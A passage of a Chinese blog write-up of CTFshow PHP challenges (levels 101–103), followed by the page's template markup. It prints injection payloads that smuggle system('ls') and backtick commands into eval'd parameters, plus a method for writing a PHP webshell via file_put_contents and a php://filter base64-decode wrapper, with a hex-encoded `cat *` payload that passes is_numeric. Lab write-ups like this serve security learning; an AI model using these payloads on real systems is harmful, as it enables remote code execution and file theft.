+<p>为什么要介绍反射类，这个题没有任何有关flag的信息，</p>
+<p>所以flag很有可能藏在反射类中</p>
+<p>利用eval执行函数，将类显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br><span class="line">?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&#x2F;*&amp;v3&#x3D;*&#x2F;;</span><br><span class="line">非预期：</span><br><span class="line">?v1&#x3D;1&amp;v2&#x3D;?&gt;&lt;?php echo &#96;ls&#96;?&gt;&#x2F;*&amp;v3&#x3D;;*&#x2F;</span><br><span class="line">?v1&#x3D;1&amp;v2&#x3D;-system(&#39;ls&#39;)-&amp;v3&#x3D;-1;</span><br><span class="line">?v1&#x3D;1&amp;v2&#x3D;phpinfo()?&gt;&amp;v3&#x3D;3;</span><br><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo&amp;v3&#x3D;;system(&#39;ls&#39;);</span><br></pre></td></tr></table></figure>
+<h3 id="102、103"><a href="#102、103" class="headerlink" title="102、103"></a>102、103</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 &#x3D; $_POST[&#39;v1&#39;];</span><br><span class="line">$v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">$v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">$v4 &#x3D; is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s &#x3D; substr($v2,2);&#x2F;&#x2F;截取v2第二位后开始的字符串</span><br><span class="line">    $str &#x3D; call_user_func($v1,$s);&#x2F;&#x2F;s的值返回给v1</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);&#x2F;&#x2F;将v2第二位开始截取的字符串的内容返回到v3文件中</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;hacker&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>call_user_func:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">把第一个参数作为回调函数调用</span><br><span class="line"></span><br><span class="line">call_user_func ( callable $callback , mixed $parameter &#x3D; ? , mixed $… &#x3D; ? ) : mixed</span><br><span class="line"></span><br><span class="line">第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br></pre></td></tr></table></figure>
+<p>明了：v3是个文件，v2是数字</p>
+<p>和99思路一样，主要是利用file_put_contents()函数写马，进后台</p>
+<p>1、v3=php:/ /filter/write=convert.base64-decode/resource=1.php</p>
+<p>2.找到一个命令，经过base64和某种加密后能变成数字，写入1.php </p>
+<p>3.访问1.php，POST v1=解密算法（函数）</p>
+<p>符合条件的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;cat *&#96;;</span><br><span class="line">经过base64 ： PD89YGNhdCAqYDs&#x3D;</span><br><span class="line">经过16进制：5044383959474e6864434171594473 &#x2F;&#x2F; 注意去掉base64末尾的&#x3D;</span><br></pre></td></tr></table></figure>
+<p>最终payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;GET</span><br><span class="line">?v2&#x3D;005044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php   &#x2F;&#x2F;v2前要补两个数字，e被认为是科学计数法，可以绕过</span><br><span class="line">&#x2F;&#x2F;POST</span><br><span class="line">v1&#x3D;hex2bin</span><br><span class="line">访问1.php，查看源码</span><br></pre></td></tr></table></figure>
+<h3 id="104、106、"><a href="#104、106、" class="headerlink" title="104、106、"></a>104、106、</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-CTFshow/" rel="tag"># CTF & CTFshow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/26/Dropbox/" rel="prev" title="Dropbox">
+      <i class="fa fa-chevron-left"></i> Dropbox
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/22/SQL%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" rel="next" title="SQL注入小结">
+      SQL注入小结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7"><span class="nav-number">2.</span> <span class="nav-text">php特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#89%E3%80%81%E6%95%B0%E7%BB%84%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">89、数组正则绕过表达式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#90%E3%80%8192-95%E3%80%81intval-%E5%87%BD%E6%95%B0%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">90、92-95、intval()函数语法：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#91%E3%80%81%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-number">3.</span> <span class="nav-text">91、正则表达式修饰符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#highlight-file%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">highlight_file函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#97%E3%80%81php%E4%B8%ADhash%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="nav-number">3.2.</span> <span class="nav-text">97、php中hash比较缺陷:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#98%E3%80%81%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">3.3.</span> <span class="nav-text">98、三目运算+变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#99%E3%80%81"><span class="nav-number">3.4.</span> <span class="nav-text">99、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#100%E3%80%81"><span class="nav-number">3.5.</span> <span class="nav-text">100、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#102%E3%80%81103"><span class="nav-number">3.6.</span> <span class="nav-text">102、103</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#104%E3%80%81106%E3%80%81"><span class="nav-number">3.7.</span> <span class="nav-text">104、106、</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">六公子买单</p>
+  <div class="site-description" itemprop="description">一头努力的菜鸟</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">六公子买单</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
